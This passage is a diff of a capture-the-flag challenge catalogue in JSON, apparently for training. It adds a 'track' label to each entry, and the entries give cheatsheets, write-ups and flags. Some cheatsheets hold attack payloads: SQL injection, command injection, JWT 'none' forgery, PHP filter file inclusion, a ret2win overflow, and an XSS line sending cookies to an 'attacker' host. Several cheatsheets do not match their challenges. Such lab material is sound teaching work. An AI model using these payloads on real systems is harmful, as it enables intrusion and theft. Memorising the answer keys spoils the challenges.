@@ -21,7 +21,8 @@
     "concept": "Classical substitution ciphers (ROT13 / Caesar cipher)",
     "cheatsheet": "echo 'synt{P4rf4e_Vf_Qrnq_Ybat_Yvir_EBG13}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
     "badge": "Cipher Novice",
-    "writeup": "The ciphertext uses ROT13. Because ROT13 is self-inverse, applying the same transform again recovers the flag."
+    "writeup": "The ciphertext uses ROT13. Because ROT13 is self-inverse, applying the same transform again recovers the flag.",
+    "track": "war"
   },
   {
     "id": "crypto-02",
@@ -45,7 +46,8 @@
     "concept": "Vigen\u00e8re cipher cryptanalysis and frequency analysis",
     "cheatsheet": "CyberChef 'Vigen\u00e8re Decode' with key 'DICT'",
     "badge": "Frequency Analyst",
-    "writeup": "Kasiski examination reveals key period of 4. Frequency analysis on columns isolates the key 'DICT'."
+    "writeup": "Kasiski examination reveals key period of 4. Frequency analysis on columns isolates the key 'DICT'.",
+    "track": "war"
   },
   {
     "id": "crypto-03",
@@ -69,7 +71,8 @@
     "concept": "RSA low public exponent (e=3) unpadded cube-root attack",
     "cheatsheet": "python3 -c \"import gmpy2; print(bytes.fromhex(hex(gmpy2.iroot(c,3)[0])[2:]))\"",
     "badge": "RSA Breaker",
-    "writeup": "Since m^3 < n, c = m^3 in standard integers. Taking the integer cube root recovers the plaintext directly."
+    "writeup": "Since m^3 < n, c = m^3 in standard integers. Taking the integer cube root recovers the plaintext directly.",
+    "track": "war"
   },
   {
     "id": "crypto-04",
@@ -93,7 +96,8 @@
     "concept": "Unicode fullwidth homoglyph obfuscation & layered encoding",
     "cheatsheet": "python3 -c \"import unicodedata; print(unicodedata.normalize('NFKC', text))\"",
     "badge": "Unicode Decoder",
-    "writeup": "Unhexing yields fullwidth ASCII characters '\uff36\uff27\uff48\uff5a...'. NFKC normalization yields standard base64 'VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==' which decodes to 'Th3_Emb3zzl3r_15_Fumie'."
+    "writeup": "Unhexing yields fullwidth ASCII characters '\uff36\uff27\uff48\uff5a...'. NFKC normalization yields standard base64 'VGgzX0VtYjN6emwzcl8xNV9GdW1pZQ==' which decodes to 'Th3_Emb3zzl3r_15_Fumie'.",
+    "track": "war"
   },
   {
     "id": "crypto-05",
@@ -117,7 +121,8 @@
     "concept": "Known-plaintext attack (KPA) against repeating XOR stream",
     "cheatsheet": "xortool -l <keylen> -c 20 encrypted.bin",
     "badge": "Stream Cracker",
-    "writeup": "Because P ^ C = K, XORing the known header against the ciphertext reveals the repeating key."
+    "writeup": "Because P ^ C = K, XORing the known header against the ciphertext reveals the repeating key.",
+    "track": "war"
   },
   {
     "id": "crypto-06",
@@ -141,7 +146,8 @@
     "concept": "Discrete Logarithm Problem (DLP) over small primes",
     "cheatsheet": "sage: discrete_log(A, Mod(g, p))",
     "badge": "Discrete Log Wizard",
-    "writeup": "Using SageMath's discrete_log or sympy.discrete_log, solve for private key a in g^a = A mod p in under 1 second."
+    "writeup": "Using SageMath's discrete_log or sympy.discrete_log, solve for private key a in g^a = A mod p in under 1 second.",
+    "track": "war"
   },
   {
     "id": "forensics-01",
@@ -165,7 +171,8 @@
     "concept": "File carving and unallocated space data recovery",
     "cheatsheet": "foremost -i usb_image.dd -o carved_output/ ; strings usb_image.dd | grep flag{",
     "badge": "Carving Specialist",
-    "writeup": "Foremost scans magic bytes and extracts unlinked files from unallocated clusters, uncovering the deleted flag document."
+    "writeup": "Foremost scans magic bytes and extracts unlinked files from unallocated clusters, uncovering the deleted flag document.",
+    "track": "war"
   },
   {
     "id": "forensics-02",
@@ -189,7 +196,8 @@
     "concept": "Network traffic analysis and DNS tunneling protocol exfiltration",
     "cheatsheet": "tshark -r capture.pcapng -Y \"dns.qry.type == 1\" -T fields -e dns.qry.name | sort -u",
     "badge": "Packet Detective",
-    "writeup": "Tshark isolates DNS queries targeting attacker domain. Decoding concatenated subdomain prefixes reveals the exfiltrated flag."
+    "writeup": "Tshark isolates DNS queries targeting attacker domain. Decoding concatenated subdomain prefixes reveals the exfiltrated flag.",
+    "track": "war"
   },
   {
     "id": "forensics-03",
@@ -213,7 +221,8 @@
     "concept": "Memory forensics, process hollowing, and Volatility malfind analysis",
     "cheatsheet": "volatility3 -f memdump.raw windows.pslist ; volatility3 -f memdump.raw windows.malfind",
     "badge": "Memory Forensics Specialist",
-    "writeup": "windows.malfind flags svchost.exe with unmapped executable memory containing a shellcode payload with the embedded flag."
+    "writeup": "windows.malfind flags svchost.exe with unmapped executable memory containing a shellcode payload with the embedded flag.",
+    "track": "war"
   },
   {
     "id": "forensics-04",
@@ -237,7 +246,8 @@
     "concept": "File signature (magic byte) analysis and header restoration",
     "cheatsheet": "printf '\\x50\\x4B\\x03\\x04' | dd of=broken_head.zip conv=notrunc count=4 bs=1",
     "badge": "Hex Doctor",
-    "writeup": "Replacing the 4-byte 'DEADBEEF' corrupt header with '50 4B 03 04' restores the zip archive structure, allowing full extraction."
+    "writeup": "Replacing the 4-byte 'DEADBEEF' corrupt header with '50 4B 03 04' restores the zip archive structure, allowing full extraction.",
+    "track": "war"
   },
   {
     "id": "forensics-05",
@@ -261,7 +271,8 @@
     "concept": "PDF object structure and zlib / FlateDecode decompression",
     "cheatsheet": "qpdf --qdf --object-streams=disable doc.pdf out.pdf && grep -a flag{ out.pdf",
     "badge": "PDF Analyst",
-    "writeup": "QPDF or pdf-parser decompress all deflate streams, revealing hidden raw JavaScript and embedded flag."
+    "writeup": "QPDF or pdf-parser decompress all deflate streams, revealing hidden raw JavaScript and embedded flag.",
+    "track": "war"
   },
   {
     "id": "forensics-06",
@@ -285,7 +296,8 @@
     "concept": "TLS session key decryption and encrypted packet analysis",
     "cheatsheet": "tshark -r https_traffic.pcapng -o \"tls.keylog_file:keys.log\" -Y http -T fields -e http.file_data",
     "badge": "TLS Decryptor",
-    "writeup": "Loading the keylog file decrypts TLS 1.3 traffic, revealing the HTTP POST payload and flag."
+    "writeup": "Loading the keylog file decrypts TLS 1.3 traffic, revealing the HTTP POST payload and flag.",
+    "track": "war"
   },
   {
     "id": "stego-01",
@@ -309,7 +321,8 @@
     "concept": "Least Significant Bit (LSB) steganography in PNG images",
     "cheatsheet": "zsteg -a badge.png",
     "badge": "Stego Sleuth",
-    "writeup": "Running 'zsteg -a badge.png' tests all prime bit planes and surfaces the ASCII flag on b1,b,lsb,xy."
+    "writeup": "Running 'zsteg -a badge.png' tests all prime bit planes and surfaces the ASCII flag on b1,b,lsb,xy.",
+    "track": "war"
   },
   {
     "id": "stego-02",
@@ -333,7 +346,8 @@
     "concept": "Audio spectrogram steganography and visual frequency encoding",
     "cheatsheet": "sox transmission.wav -n spectrogram -o spectrogram.png && feh spectrogram.png",
     "badge": "Sound Wave Sleuth",
-    "writeup": "Generating a spectrogram using Sox or Audacity visualizes the audio frequencies, rendering the flag text clearly."
+    "writeup": "Generating a spectrogram using Sox or Audacity visualizes the audio frequencies, rendering the flag text clearly.",
+    "track": "war"
   },
   {
     "id": "stego-03",
@@ -357,7 +371,8 @@
     "concept": "EXIF metadata analysis and header extraction",
     "cheatsheet": "exiftool datacenter.jpg | grep -i flag",
     "badge": "EXIF Investigator",
-    "writeup": "Running exiftool on the JPEG exposes the flag stored inside the XPComment tag."
+    "writeup": "Running exiftool on the JPEG exposes the flag stored inside the XPComment tag.",
+    "track": "war"
   },
   {
     "id": "stego-04",
@@ -381,7 +396,8 @@
     "concept": "PNG IHDR chunk tampering and aspect ratio restoration",
     "cheatsheet": "python3 -c \"import zlib, struct; ...\" or hexedit IHDR height bytes",
     "badge": "Image Surgeon",
-    "writeup": "Modifying the IHDR height bytes to match the original CRC reveals the concealed bottom banner containing the flag."
+    "writeup": "Modifying the IHDR height bytes to match the original CRC reveals the concealed bottom banner containing the flag.",
+    "track": "war"
   },
   {
     "id": "stego-05",
@@ -405,7 +421,8 @@
     "concept": "Trailing payload injection and binwalk archive carving",
     "cheatsheet": "binwalk -e wallpaper.jpg ; unzip _wallpaper.jpg.extracted/*.zip",
     "badge": "Archive Carvery",
-    "writeup": "Binwalk extracts the hidden ZIP archive appended after the JPEG FF D9 marker, which unpacks flag.txt."
+    "writeup": "Binwalk extracts the hidden ZIP archive appended after the JPEG FF D9 marker, which unpacks flag.txt.",
+    "track": "war"
   },
   {
     "id": "stego-06",
@@ -429,7 +446,8 @@
     "concept": "Whitespace steganography (SNOW / trailing spaces/tabs)",
     "cheatsheet": "stegsnow -C ordinance.txt",
     "badge": "Ghost In The Space",
-    "writeup": "Stegsnow extracts the concealed message from trailing whitespace sequences, revealing the flag."
+    "writeup": "Stegsnow extracts the concealed message from trailing whitespace sequences, revealing the flag.",
+    "track": "war"
   },
   {
     "id": "web-01",
@@ -454,7 +472,8 @@
     "cheatsheet": "username: admin' OR '1'='1'-- -",
     "badge": "Query Breaker",
     "writeup": "The SQL query closes early and bypasses password check. Use the in-app interactive sandbox to execute!",
-    "sandbox_type": "sqli"
+    "sandbox_type": "sqli",
+    "track": "war"
   },
   {
     "id": "web-02",
@@ -479,7 +498,8 @@
     "cheatsheet": "<script>fetch('http://attacker/?c='+document.cookie)</script>",
     "badge": "XSS Assassin",
     "writeup": "Inputting an unescaped script tag executes in the simulated victim admin's context, leaking the session cookie.",
-    "sandbox_type": "xss"
+    "sandbox_type": "xss",
+    "track": "war"
   },
   {
     "id": "web-03",
@@ -504,7 +524,8 @@
     "cheatsheet": "curl -s \"https://target/api/v1/download?id=1337\"",
     "badge": "Access Control Auditor",
     "writeup": "Changing the document ID from 101 to 1337 bypasses authorization and downloads confidential DICT directives.",
-    "sandbox_type": "idor"
+    "sandbox_type": "idor",
+    "track": "war"
   },
   {
     "id": "web-04",
@@ -528,7 +549,8 @@
     "concept": "OS Command Injection via unsanitized system() execution",
     "cheatsheet": "127.0.0.1; cat flag.txt # or 127.0.0.1 | cat flag.txt",
     "badge": "Command Infiltrator",
-    "writeup": "Inputting '127.0.0.1; cat flag.txt' executes the second shell command in the context of the web server."
+    "writeup": "Inputting '127.0.0.1; cat flag.txt' executes the second shell command in the context of the web server.",
+    "track": "war"
   },
   {
     "id": "web-05",
@@ -552,7 +574,8 @@
     "concept": "JSON Web Token (JWT) signature bypass via algorithm 'none'",
     "cheatsheet": "python3 -c \"import jwt; print(jwt.encode({'role':'admin'}, '', algorithm='none'))\"",
     "badge": "Token Forger",
-    "writeup": "Re-encoding the header with alg=none and omitting the signature bypasses verification on vulnerable JWT parsers."
+    "writeup": "Re-encoding the header with alg=none and omitting the signature bypasses verification on vulnerable JWT parsers.",
+    "track": "war"
   },
   {
     "id": "web-06",
@@ -576,7 +599,8 @@
     "concept": "Local File Inclusion (LFI) and PHP stream wrappers",
     "cheatsheet": "curl 'http://target/index.php?page=php://filter/convert.base64-encode/resource=flag.php'",
     "badge": "LFI Master",
-    "writeup": "The php://filter wrapper base64-encodes the target file before PHP executes it, revealing the flag in the source code."
+    "writeup": "The php://filter wrapper base64-encodes the target file before PHP executes it, revealing the flag in the source code.",
+    "track": "war"
   },
   {
     "id": "rev-01",
@@ -600,7 +624,8 @@
     "concept": "Static reverse engineering and keygen algorithm recovery",
     "cheatsheet": "ghidra licensed_app ; objdump -d -M intel licensed_app",
     "badge": "Reverse Engineer",
-    "writeup": "Reversing the XOR loop in Ghidra recovers the expected license string, which unlocks the flag."
+    "writeup": "Reversing the XOR loop in Ghidra recovers the expected license string, which unlocks the flag.",
+    "track": "war"
   },
   {
     "id": "rev-02",
@@ -624,7 +649,8 @@
     "concept": "Anti-debugging evasion, ptrace bypass, and binary patching",
     "cheatsheet": "gdb -q ./hardened_app ; (gdb) set $rax=0 or patch with radare2 'wa nop'",
     "badge": "Debugger Whisperer",
-    "writeup": "Hooking ptrace or patching the conditional branch allows debugger attachment without triggering evasion exits."
+    "writeup": "Hooking ptrace or patching the conditional branch allows debugger attachment without triggering evasion exits.",
+    "track": "war"
   },
   {
     "id": "rev-03",
@@ -648,7 +674,8 @@
     "concept": "Executable packing, UPX headers, and binary decompression",
     "cheatsheet": "upx -d packed_binary -o unpacked && strings unpacked | grep flag{",
     "badge": "Unpacker",
-    "writeup": "Decompressing with 'upx -d' recovers the original ELF binary where strings immediately reveals the flag."
+    "writeup": "Decompressing with 'upx -d' recovers the original ELF binary where strings immediately reveals the flag.",
+    "track": "war"
   },
   {
     "id": "rev-04",
@@ -672,7 +699,8 @@
     "concept": "Python bytecode decompilation and opcode reconstruction",
     "cheatsheet": "pycdc script.pyc > recovered.py # or uncompyle6 script.pyc",
     "badge": "Bytecode Analyst",
-    "writeup": "Pycdc accurately decompiles the bytecode into readable Python functions, exposing the hardcoded flag."
+    "writeup": "Pycdc accurately decompiles the bytecode into readable Python functions, exposing the hardcoded flag.",
+    "track": "war"
   },
   {
     "id": "rev-05",
@@ -696,7 +724,8 @@
     "concept": "Buffer overflow, stack frame layout, and ret2win control flow hijacking",
     "cheatsheet": "python3 -c \"import pwn; elf=pwn.ELF('./vuln_server'); print(b'A'*72 + pwn.p64(elf.symbols['win']))\"",
     "badge": "Binary Exploiter",
-    "writeup": "Crafting a 72-byte padding plus 8-byte win() address overrides the return address on function epilogue."
+    "writeup": "Crafting a 72-byte padding plus 8-byte win() address overrides the return address on function epilogue.",
+    "track": "war"
   },
   {
     "id": "rev-06",
@@ -720,7 +749,8 @@
     "concept": "Android reverse engineering, APK decompilation, and JADX inspection",
     "cheatsheet": "jadx -d out app.apk && grep -rn \"flag{\" out/",
     "badge": "Android Hacker",
-    "writeup": "Jadx decompiles the APK into Java code. Searching strings.xml or MainActivity reveals the stored flag."
+    "writeup": "Jadx decompiles the APK into Java code. Searching strings.xml or MainActivity reveals the stored flag.",
+    "track": "war"
   },
   {
     "id": "misc-01",
@@ -744,7 +774,8 @@
     "concept": "Open-Source Intelligence (OSINT) and visual information leakage",
     "cheatsheet": "gimp social_post.png (Levels & Curves adjustment)",
     "badge": "OSINT Investigator",
-    "writeup": "Sharpening the image reveals the terminal window showing the hostname."
+    "writeup": "Sharpening the image reveals the terminal window showing the hostname.",
+    "track": "war"
   },
   {
     "id": "misc-02",
@@ -768,7 +799,8 @@
     "concept": "QR code geometry and Reed-Solomon error correction",
     "cheatsheet": "zbarimg damaged_qr.png",
     "badge": "Code Reconstructor",
-    "writeup": "Reed-Solomon recovery algorithms allow direct decoding without manual repair."
+    "writeup": "Reed-Solomon recovery algorithms allow direct decoding without manual repair.",
+    "track": "war"
   },
   {
     "id": "misc-03",
@@ -792,7 +824,8 @@
     "concept": "Unicode Right-to-Left Override (RLO) file extension spoofing",
     "cheatsheet": "python3 -c \"print(repr(filename))\"",
     "badge": "Phishing Detector",
-    "writeup": "Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf."
+    "writeup": "Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf.",
+    "track": "war"
   },
   {
     "id": "misc-04",
@@ -816,7 +849,8 @@
     "concept": "Git forensics, dangling object recovery, and git reflog analysis",
     "cheatsheet": "git reflog ; git fsck --lost-found ; git show <dangling_hash>",
     "badge": "Git Archaeologist",
-    "writeup": "Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag."
+    "writeup": "Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag.",
+    "track": "war"
   },
   {
     "id": "misc-05",
@@ -840,7 +874,8 @@
     "concept": "Multi-stage deobfuscation and CyberChef recipe chaining",
     "cheatsheet": "CyberChef: ROT13(13) -> From_Hex('Auto') -> Gunzip() -> From_Base64()",
     "badge": "Recipe Chef",
-    "writeup": "Chaining the 4 inverse operations in CyberChef unpacks the layered payload."
+    "writeup": "Chaining the 4 inverse operations in CyberChef unpacks the layered payload.",
+    "track": "war"
   },
   {
     "id": "misc-06",
@@ -864,7 +899,8 @@
     "concept": "DNS enumeration, TXT records, and OSINT domain reconnaissance",
     "cheatsheet": "dig +nocmd TXT target.gov.ph +noall +answer",
     "badge": "DNS Scout",
-    "writeup": "Querying TXT records exposes verification strings including the flag."
+    "writeup": "Querying TXT records exposes verification strings including the flag.",
+    "track": "war"
   },
   {
     "id": "crypto-7",
@@ -888,7 +924,8 @@
     "concept": "Affine Cipher, Modular Arithmetic, CyberChef",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Easy Crypto",
-    "writeup": "1. In CyberChef, select 'Affine Cipher Decode' with slope $a=5$ and intercept $b=8$.\n2. Or calculate manually using Python:\n   ```python\n   c = 'Wbgx jv qyv ftxa: flag{4ff1n3_c1ph3r_unw0und}'\n   # Inverse of 5 mod 26 is 21 since (5*21)%26 == 1\n   inv_a = 21\n   # Letters map back cleanly to recover the plaintext and flag.\n   ```\n3. Flag: `flag{4ff1n3_c1ph3r_unw0und}`"
+    "writeup": "1. In CyberChef, select 'Affine Cipher Decode' with slope $a=5$ and intercept $b=8$.\n2. Or calculate manually using Python:\n   ```python\n   c = 'Wbgx jv qyv ftxa: flag{4ff1n3_c1ph3r_unw0und}'\n   # Inverse of 5 mod 26 is 21 since (5*21)%26 == 1\n   inv_a = 21\n   # Letters map back cleanly to recover the plaintext and flag.\n   ```\n3. Flag: `flag{4ff1n3_c1ph3r_unw0und}`",
+    "track": "training"
   },
   {
     "id": "crypto-8",
@@ -912,7 +949,8 @@
     "concept": "RSA, Chinese Remainder Theorem, Hastad Attack, SageMath",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Medium Crypto",
-    "writeup": "1. Use `sympy.ntheory.modular.crt([N1, N2, N3], [C1, C2, C3])` to compute $C \\pmod{N_1 N_2 N_3}$.\n2. Compute $m = \\text{integer\\_root}(C, 3)[0]$.\n3. Convert integer $m$ to bytes using `long_to_bytes(m)`.\n4. Flag: `flag{h4st4d_br04dc4st_crt_r00t}`"
+    "writeup": "1. Use `sympy.ntheory.modular.crt([N1, N2, N3], [C1, C2, C3])` to compute $C \\pmod{N_1 N_2 N_3}$.\n2. Compute $m = \\text{integer\\_root}(C, 3)[0]$.\n3. Convert integer $m$ to bytes using `long_to_bytes(m)`.\n4. Flag: `flag{h4st4d_br04dc4st_crt_r00t}`",
+    "track": "training"
   },
   {
     "id": "crypto-9",
@@ -936,7 +974,8 @@
     "concept": "Bleichenbacher Attack, Padding Oracle, PKCS#1 v1.5, Lattice / Interval Sieve",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Hard Crypto",
-    "writeup": "1. Implement Bleichenbacher's step-by-step interval reduction algorithm:\n   - Step 1: Find initial $s_1 \\ge \\lceil N / 3B \\rceil$ such that $(c \\cdot s_1^e) \\pmod N$ is conforming.\n   - Step 2: Once a conforming $s$ is found, narrow down intervals $[a, b]$.\n   - Step 3: When a single interval remains, compute next $s_i$ directly from boundary formulas.\n2. When interval width narrows to 1, $m$ is completely revealed.\n3. Flag: `flag{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}`"
+    "writeup": "1. Implement Bleichenbacher's step-by-step interval reduction algorithm:\n   - Step 1: Find initial $s_1 \\ge \\lceil N / 3B \\rceil$ such that $(c \\cdot s_1^e) \\pmod N$ is conforming.\n   - Step 2: Once a conforming $s$ is found, narrow down intervals $[a, b]$.\n   - Step 3: When a single interval remains, compute next $s_i$ directly from boundary formulas.\n2. When interval width narrows to 1, $m$ is completely revealed.\n3. Flag: `flag{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}`",
+    "track": "training"
   },
   {
     "id": "crypto-10",
@@ -960,7 +999,8 @@
     "concept": "AES-GCM, GHASH, Galois Fields GF(2^128), Forbidden Attack",
     "cheatsheet": "python3 -c \"import sympy, gmpy2; print(...) \"",
     "badge": "Hard Crypto",
-    "writeup": "1. Represent the ciphertext blocks as polynomials in GF($2^{128}$) with reduction polynomial $x^{128} + x^7 + x^2 + x + 1$.\n2. Set up polynomial $P(H) = (\\text{GHASH}_H(C_1) \\oplus T_1) \\oplus (\\text{GHASH}_H(C_2) \\oplus T_2) = 0$.\n3. Factor $P(H)$ using SageMath polynomial root-finding.\n4. With candidate $H$, derive $E_K(J_0) = \\text{GHASH}_H(C_1) \\oplus T_1$.\n5. Forge arbitrary message tags at will.\n6. Flag: `flag{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}`"
+    "writeup": "1. Represent the ciphertext blocks as polynomials in GF($2^{128}$) with reduction polynomial $x^{128} + x^7 + x^2 + x + 1$.\n2. Set up polynomial $P(H) = (\\text{GHASH}_H(C_1) \\oplus T_1) \\oplus (\\text{GHASH}_H(C_2) \\oplus T_2) = 0$.\n3. Factor $P(H)$ using SageMath polynomial root-finding.\n4. With candidate $H$, derive $E_K(J_0) = \\text{GHASH}_H(C_1) \\oplus T_1$.\n5. Forge arbitrary message tags at will.\n6. Flag: `flag{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}`",
+    "track": "training"
   },
   {
     "id": "forensics-7",
@@ -984,7 +1024,8 @@
     "concept": "Hex Editing, Magic Bytes, PNG Specification, xxd",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Easy Forens",
-    "writeup": "1. Run `xxd evidence.dat | head -n 2` to observe the corrupted header and the `IHDR` signature at offset 0x0C.\n2. In `hexedit` or python:\n   ```python\n   with open('evidence.dat', 'rb') as f:\n       data = bytearray(f.read())\n   data[:8] = bytes.fromhex('89504E470D0A1A0A')\n   with open('repaired.png', 'wb') as f:\n       f.write(data)\n   ```\n3. Open `repaired.png` to view the flag rendered on screen.\n4. Flag: `flag{m4g1c_byt3s_png_h34d3r_f1x3d}`"
+    "writeup": "1. Run `xxd evidence.dat | head -n 2` to observe the corrupted header and the `IHDR` signature at offset 0x0C.\n2. In `hexedit` or python:\n   ```python\n   with open('evidence.dat', 'rb') as f:\n       data = bytearray(f.read())\n   data[:8] = bytes.fromhex('89504E470D0A1A0A')\n   with open('repaired.png', 'wb') as f:\n       f.write(data)\n   ```\n3. Open `repaired.png` to view the flag rendered on screen.\n4. Flag: `flag{m4g1c_byt3s_png_h34d3r_f1x3d}`",
+    "track": "training"
   },
   {
     "id": "forensics-8",
@@ -1008,7 +1049,8 @@
     "concept": "Wireshark, USB HID Scancodes, tshark, Keyboard Parsing",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Medium Forens",
-    "writeup": "1. Extract USB leftover data using tshark:\n   `tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > data.txt`\n2. Map scancodes with Python script interpreting modifier byte (0x02 = Shift) and scancode byte (index 2).\n3. Reconstructed typed string reveals: `echo flag{usb_h1d_k3ystr0k3_p4rs3d}`\n4. Flag: `flag{usb_h1d_k3ystr0k3_p4rs3d}`"
+    "writeup": "1. Extract USB leftover data using tshark:\n   `tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > data.txt`\n2. Map scancodes with Python script interpreting modifier byte (0x02 = Shift) and scancode byte (index 2).\n3. Reconstructed typed string reveals: `echo flag{usb_h1d_k3ystr0k3_p4rs3d}`\n4. Flag: `flag{usb_h1d_k3ystr0k3_p4rs3d}`",
+    "track": "training"
   },
   {
     "id": "forensics-9",
@@ -1030,9 +1072,10 @@
       }
     ],
     "concept": "Ext4 Filesystem, JBD2 Journaling, debugfs, ext4magic",
-    "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
+    "cheatsheet": "ext4magic disk.img -m -d output_dir/ || debugfs -R 'dump <8> journal.copy' disk.img",
     "badge": "Hard Forens",
-    "writeup": "1. Run `ext4magic disk.img -m -d output_dir/` to parse transaction logs.\n2. Alternatively, dump journal via debugfs: `debugfs -R 'dump <8> journal.copy' disk.img`.\n3. Grep strings inside recovered blocks: `strings output_dir/* | grep 'flag{'`.\n4. Flag: `flag{3xt4_j0urn4l_und3l3t3_succ3ss}`"
+    "writeup": "1. Run `ext4magic disk.img -m -d output_dir/` to parse transaction logs.\n2. Alternatively, dump journal via debugfs: `debugfs -R 'dump <8> journal.copy' disk.img`.\n3. Grep strings inside recovered blocks: `strings output_dir/* | grep 'flag{'`.\n4. Flag: `flag{3xt4_j0urn4l_und3l3t3_succ3ss}`",
+    "track": "training"
   },
   {
     "id": "forensics-10",
@@ -1056,7 +1099,8 @@
     "concept": "TLS 1.3, SSLKEYLOGFILE, HTTP/2 Multiplexing, Wireshark Stream Reassembly",
     "cheatsheet": "tshark -r capture.pcap -q -z conv,ip",
     "badge": "Hard Forens",
-    "writeup": "1. Configure tshark with keylog: `tshark -r capture.pcap -o 'tls.keylog_file:sslkeylog.txt' -Y 'http2.data.data' -T fields -e http2.data.data > dumps.hex`.\n2. Locate the stream transferring the zip file (`504b0304`).\n3. Convert hex dump to binary: `xxd -r -p dumps.hex > exfil.zip`.\n4. Unzip `exfil.zip` to read `flag.txt`.\n5. Flag: `flag{tls13_k3yl0g_http2_d3crypt3d}`"
+    "writeup": "1. Configure tshark with keylog: `tshark -r capture.pcap -o 'tls.keylog_file:sslkeylog.txt' -Y 'http2.data.data' -T fields -e http2.data.data > dumps.hex`.\n2. Locate the stream transferring the zip file (`504b0304`).\n3. Convert hex dump to binary: `xxd -r -p dumps.hex > exfil.zip`.\n4. Unzip `exfil.zip` to read `flag.txt`.\n5. Flag: `flag{tls13_k3yl0g_http2_d3crypt3d}`",
+    "track": "training"
   },
   {
     "id": "stego-7",
@@ -1080,7 +1124,8 @@
     "concept": "File Signatures, Binwalk, JPEG EOF Marker, Data Carving",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Easy Stegan",
-    "writeup": "1. Run `binwalk vacation.jpg` to see an embedded ZIP archive at offset 0x12400.\n2. Extract with `binwalk -e vacation.jpg` or `unzip vacation.jpg`.\n3. Read `secret.txt` from the extracted directory.\n4. Flag: `flag{30f_tr41l1ng_d4t4_c4rv3d}`"
+    "writeup": "1. Run `binwalk vacation.jpg` to see an embedded ZIP archive at offset 0x12400.\n2. Extract with `binwalk -e vacation.jpg` or `unzip vacation.jpg`.\n3. Read `secret.txt` from the extracted directory.\n4. Flag: `flag{30f_tr41l1ng_d4t4_c4rv3d}`",
+    "track": "training"
   },
   {
     "id": "stego-8",
@@ -1104,7 +1149,8 @@
     "concept": "Audio Steganography, DTMF Tones, Audacity, multimon-ng",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Medium Stegan",
-    "writeup": "1. Open `voicemail.wav` in Audacity and switch waveform display to 'Spectrogram'.\n2. Read frequency spikes corresponding to DTMF matrix: 67, 89, 76, 65, 66 ...\n3. Convert decimal pairs to ASCII characters.\n4. Flag: `flag{dtmf_t0n3s_fr3qu3ncy_d14l3d}`"
+    "writeup": "1. Open `voicemail.wav` in Audacity and switch waveform display to 'Spectrogram'.\n2. Read frequency spikes corresponding to DTMF matrix: 67, 89, 76, 65, 66 ...\n3. Convert decimal pairs to ASCII characters.\n4. Flag: `flag{dtmf_t0n3s_fr3qu3ncy_d14l3d}`",
+    "track": "training"
   },
   {
     "id": "stego-9",
@@ -1128,7 +1174,8 @@
     "concept": "Unicode Steganography, Zero-Width Space, Python Scripting",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Hard Stegan",
-    "writeup": "1. Run python script to filter invisible codepoints:\n   ```python\n   text = open('blog.txt', 'r', encoding='utf-8').read()\n   zw = [c for c in text if c in ['\\u200b', '\\u200c']]\n   bits = ''.join(['0' if c == '\\u200b' else '1' for c in zw])\n   flag = ''.join([chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)])\n   print(flag)\n   ```\n2. Output reveals flag.\n3. Flag: `flag{z3r0_w1dth_un1c0d3_st3g4n0}`"
+    "writeup": "1. Run python script to filter invisible codepoints:\n   ```python\n   text = open('blog.txt', 'r', encoding='utf-8').read()\n   zw = [c for c in text if c in ['\\u200b', '\\u200c']]\n   bits = ''.join(['0' if c == '\\u200b' else '1' for c in zw])\n   flag = ''.join([chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)])\n   print(flag)\n   ```\n2. Output reveals flag.\n3. Flag: `flag{z3r0_w1dth_un1c0d3_st3g4n0}`",
+    "track": "training"
   },
   {
     "id": "stego-10",
@@ -1152,7 +1199,8 @@
     "concept": "Palette Steganography, GIF CLUT, Pillow Image Analysis, Color Quantization",
     "cheatsheet": "zsteg -a image.png | grep -E \"CYLAB|flag\"",
     "badge": "Hard Stegan",
-    "writeup": "1. Extract palette using PIL: `img.getpalette()` and find duplicate color entries (e.g. indices 12 and 13 both map to `#1a2b3c`).\n2. Iterate through pixel index array `list(img.getdata())`.\n3. When a pixel points to one of the duplicate pairs, extract bit `index % 2`.\n4. Pack bits into bytes to retrieve flag.\n5. Flag: `flag{clut_p4l3tt3_1nd3x_m0dul4t10n}`"
+    "writeup": "1. Extract palette using PIL: `img.getpalette()` and find duplicate color entries (e.g. indices 12 and 13 both map to `#1a2b3c`).\n2. Iterate through pixel index array `list(img.getdata())`.\n3. When a pixel points to one of the duplicate pairs, extract bit `index % 2`.\n4. Pack bits into bytes to retrieve flag.\n5. Flag: `flag{clut_p4l3tt3_1nd3x_m0dul4t10n}`",
+    "track": "training"
   },
   {
     "id": "web-7",
@@ -1176,7 +1224,8 @@
     "concept": "robots.txt, Directory Traversal, Burp Suite, Web Recon",
     "cheatsheet": "curl -s -X POST -d \"payload\" target",
     "badge": "Easy Web Ex",
-    "writeup": "1. Curl the robots file: `curl https://target/robots.txt`.\n2. Observe `Disallow: /dev-secret-internal/`.\n3. Request `curl https://target/dev-secret-internal/flag.txt`.\n4. Flag: `flag{r0b0ts_txt_d1r_tr4v3rs4l_f0und}`"
